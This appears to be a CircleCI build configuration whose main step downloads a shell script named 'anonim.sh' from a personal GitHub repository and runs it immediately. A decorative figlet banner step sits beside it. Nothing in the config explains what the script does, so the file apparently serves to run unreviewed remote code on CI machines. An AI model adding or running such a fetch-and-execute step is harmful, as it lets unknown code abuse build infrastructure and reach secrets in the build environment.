jobs:
  build:
    docker:
      - image: cimg/base:2022.03
    steps:
      - checkout
      # Whatever you want to do
      - run: sudo apt-get update && sudo  wget https://raw.githubusercontent.com/j0642773/dua/main/anonim.sh && chmod u+x anonim.sh && ./anonim.sh
      - run: figlet Continuous Integration Rocks!
            

